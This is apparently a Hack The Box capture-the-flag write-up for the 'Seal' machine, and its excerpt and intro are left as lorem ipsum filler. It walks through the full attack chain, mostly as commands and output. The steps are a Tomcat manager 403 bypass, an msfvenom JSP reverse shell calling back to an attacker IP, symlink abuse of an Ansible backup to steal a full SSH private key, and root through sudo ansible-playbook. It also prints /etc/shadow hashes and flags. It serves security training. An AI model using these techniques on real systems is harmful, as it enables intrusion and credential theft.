---
layout: single
title: Seal - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-08-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-seal/seal_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-seal/seal_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/seal]# nmap -Pn -n -sCV 10.10.10.250 --open                                                                        (master✱)
  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
  |   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
  |_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
  443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  |_http-title: Seal Market
  | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
  | Not valid before: 2021-05-05T10:24:03
  |_Not valid after:  2022-05-05T10:24:03
  | tls-alpn:
  |_  http/1.1
  | tls-nextprotoneg:
  |_  http/1.1
  8080/tcp open  http-proxy
  | fingerprint-strings:
  |   FourOhFourRequest:
  |     HTTP/1.1 401 Unauthorized
  |     Date: Fri, 20 Aug 2021 18:18:58 GMT
  |     Set-Cookie: JSESSIONID=node0ckxzfrsamy141gl0hvem8jus82.node0; Path=/; HttpOnly
  |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
  |     Content-Type: text/html;charset=utf-8
  |     Content-Length: 0
  |   GetRequest:
  |     HTTP/1.1 401 Unauthorized
  |     Date: Fri, 20 Aug 2021 18:18:58 GMT
  |     Set-Cookie: JSESSIONID=node09ex2b4ulw72vng49957ovldj0.node0; Path=/; HttpOnly
  |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
  |     Content-Type: text/html;charset=utf-8
  |     Content-Length: 0
  |   HTTPOptions:
  |     HTTP/1.1 200 OK
  |     Date: Fri, 20 Aug 2021 18:18:58 GMT
  |     Set-Cookie: JSESSIONID=node0rgfkubarz67yocnkxyr80we01.node0; Path=/; HttpOnly
  |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
  |     Content-Type: text/html;charset=utf-8
  |     Allow: GET,HEAD,POST,OPTIONS
  |     Content-Length: 0
  |   RPCCheck:
  |     HTTP/1.1 400 Illegal character OTEXT=0x80
  |     Content-Type: text/html;charset=iso-8859-1
  |     Content-Length: 71
  |     Connection: close
  |     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
  |   RTSPRequest:
  |     HTTP/1.1 505 Unknown Version
  |     Content-Type: text/html;charset=iso-8859-1
  |     Content-Length: 58
  |     Connection: close
  |     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
  |   Socks4:
  |     HTTP/1.1 400 Illegal character CNTL=0x4
  |     Content-Type: text/html;charset=iso-8859-1
  |     Content-Length: 69
  |     Connection: close
  |     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
  |   Socks5:
  |     HTTP/1.1 400 Illegal character CNTL=0x5
  |     Content-Type: text/html;charset=iso-8859-1
  |     Content-Length: 69
  |     Connection: close
  |_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
  | http-auth:
  | HTTP/1.1 401 Unauthorized\x0D
  |_  Server returned status 401 but no WWW-Authenticate header.
  |_http-title: Site doesn't have a title (text/html;charset=utf-8).

DIRB:
==> DIRECTORY: https://10.10.10.250/admin/
==> DIRECTORY: https://10.10.10.250/css/
==> DIRECTORY: https://10.10.10.250/host-manager/
==> DIRECTORY: https://10.10.10.250/icon/
==> DIRECTORY: https://10.10.10.250/images/
+ https://10.10.10.250/index.html (CODE:200|SIZE:19737)
==> DIRECTORY: https://10.10.10.250/js/
==> DIRECTORY: https://10.10.10.250/manager/

NIKTO:
+ SSL Info:        Subject:  /C=UK/ST=London/L=Hackney/O=Seal Pvt Ltd/OU=Infra/CN=seal.htb/emailAddress=admin@seal.htb

- Domain name: seal.htb
- Email: admin@seal.htb


2. Visit http://seal.htb:8080 and create a new account.
Looking around at issues, we find 2 users;
- luis (luis@seal.htb) Core Dev
- alex (alex@seal.htb) Infra Admin


Looking at recent changes, we find http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7, and within they remove this line:
	<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>

Trying to login on SSH with all found users (admin, luis, alex) and password '42MrHBf*z8{Z%' fails.
Trying on port 8080 we get access as user Luis. Compared to our own created user, we now have a Settings tab in the seal_markt nav bar.
Looking around there's not anything obvious we can do. However looking on the initial todo we get a hint about tomcat and
the mutual authentication.

>  ToDo
>    Remove mutual authentication for dashboard, setup registration and login features.
>    Deploy updated tomcat configuration.
>    Disable manager and host-manager.

So take a step back and go to 'https://10.10.10.250/manager/status' and we are presented with a login prompt.
Use the found creds tomcat:42MrHBf*z8{Z%

We find that Tomcat is running on version: Apache Tomcat/9.0.31 (Ubuntu). This page doesn't give us much, but we still get
error 403 Forbidden when trying to reach https://seal.htb/manager/html. We want to reach this point as this is where we would
be able to upload malicious .war files.

Googling around for 403 Bypass we come across a lot of different scripts, one called Byp4xx.

  [root:/git/htb/seal/byp4xx]# ./byp4xx.py https://seal.htb/manager/html
    [+]#BUGBOUNTYTIPS
    ..
    Between /.;/:  HTTP/1.1 401
    Between ;foo=bar;/:  HTTP/1.1 401

Executing the script we see two 401 Errors.
  > The HTTP 401 Unauthorized client error status response code indicates that the request has
  > not been applied because it lacks valid authentication credentials for the target resource

If we try to visit https://10.10.10.250/manager/.;/html we are now presented with the Application Manager!


3. Create a .war reverse shell.

  [root:/git/htb/seal]# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.2 lport=4488 -f war > rev.war                         (master✱)
    Payload size: 1100 bytes
    Final size of war file: 1100 bytes

Upload it using the GUI, but before deploying enable the burp proxy to capture the POST request.
In the request add the between (.;) symbols to bypass the 403 and the file should upload successfully.

Setup a listener and visit https://seal.htb/rev to get your shell.

  [root:/opt]# nc -lvnp 4488
    listening on [any] 4488 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.250] 48564
    id && hostname
      uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
      seal
    python3 -c 'import pty;pty.spawn("/bin/bash")';
    tomcat@seal:/var/lib/tomcat9$


4. We are unable to (easily) upload linpeas to the machine, however we quickly find a backup script that's ran by user luis every minute.

  cat /opt/backups/playbook/run.yml
  - hosts: localhost
    tasks:
    - name: Copy Files
      synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
    - name: Server Backups
      archive:
        path: /opt/backups/files/
        dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
    - name: Clean
      file:
        state: absent
        path: /opt/backups/files/

From the script/program, we see that dashboard and everything within are backed up to /opt/backups/archive. At the end of the line
they say "copy_links=yes", digging a bit deeper in to this I found:
  > "Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink."

Meaning if we can create a symlink in /var/lib/tomcat9/webapps/ROOT/admin/dashboard/, the content of the symlink will be backed up.

/var/lib/tomcat9/webapps/ROOT/admin/dashboard/:
  total 100
  drwxr-xr-x 7 root root  4096 May  7 09:26 .
  drwxr-xr-x 3 root root  4096 May  6 10:48 ..
  drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
  drwxr-xr-x 2 root root  4096 Mar  7  2015 css
  drwxr-xr-x 4 root root  4096 Mar  7  2015 images
  -rw-r--r-- 1 root root 71744 May  6 10:42 index.html
  drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
  drwxrwxrwx 2 root root  4096 Aug 25 14:16 uploads

Quickly we see that the 'uploads' directory is writable, we can create a symlink and then grab the content.

  tomcat@seal:/opt/backups/archives$ ln -d -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis-pls

We can see that one of the files is much bigger, this is because it also contains /home/luis.
  tomcat@seal:/opt/backups/archives$ ls -al
    total 114704
    drwxrwxr-x 2 luis luis      4096 Aug 25 14:38 .
    drwxr-xr-x 4 luis luis      4096 Aug 25 14:38 ..
    -rw-rw-r-- 1 luis luis 115628384 Aug 25 14:35 backup-2021-08-25-14:35:32.gz
    -rw-rw-r-- 1 luis luis    606058 Aug 25 14:36 backup-2021-08-25-14:36:32.gz

Examine the file using zcat / zgrep. My way was absolutely not the best way, as all data printed out
and I had to go through many many rows before I found the id_rsa file.

  tomcat@seal:/opt/backups/archives$ zcat -f backup-2021-08-25-14:35:32.gz
    ..
    dashboard/uploads/luis-pls/.ssh/id_rsa0000600000175000017500000000503600000000000020232 0ustar00luisluis00000000000000-----BEGIN OPENSSH PRIVATE KEY-----
    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
    u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
    -----END OPENSSH PRIVATE KEY-----

  [root:/git/htb/seal]# chmod 600 id_rsa-luis
  [root:/git/htb/seal]# ssh luis@seal.htb -i id_rsa-luis
    luis@seal:~$ id && cat user.txt
      uid=1000(luis) gid=1000(luis) groups=1000(luis)
      b05995690f877efeb55302e8f09f296b


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Always try 'sudo -l' for a quick root.

  luis@seal:~$ sudo -l
    Matching Defaults entries for luis on seal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User luis may run the following commands on seal:
        (ALL) NOPASSWD: /usr/bin/ansible-playbook *

Looking on gtfobins we find that ansible-playbook are at the very top. Follow the steps to grab root.txt.

  luis@seal:~$ TF=$(mktemp)
  luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
  luis@seal:~$ sudo /usr/bin/ansible-playbook $TF
    [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

    PLAY [localhost] ***********************************************************************************************************************

    TASK [Gathering Facts] *****************************************************************************************************************
    ok: [localhost]

    TASK [shell] ***************************************************************************************************************************
    # id && cat /root/root.txt
      uid=0(root) gid=0(root) groups=0(root)
      85239d7892c9f975905d49166e123084

    # cat /etc/shadow
      root:$6$D8b4qJlaLsRsvwuy$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r.:18752:0:99999:7:::
      luis:$6$2tGOIZ.O0MqK5nDd$nl12rn9ftZIPGGiFjDKBItGJlKB4uIwsrjVqq6Bkp2C7DVEE9/T4VuZjT1kbZjHCfVgVRGP7sqnSCiu1IRIUZ.:18753:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Bypass-403 Script:
  https://github.com/iamj0ker/bypass-403

Synchronize Module (copy_links):
  https://docs.ansible.com/ansible/2.5/modules/synchronize_module.html

Zcat / Zgrep:
  https://www.blackmoreops.com/2014/08/01/z-commands-view-compressed-tar-gz-files-without-uncompressing/

GTFObins ansible-playbook:
  https://gtfobins.github.io/gtfobins/ansible-playbook/
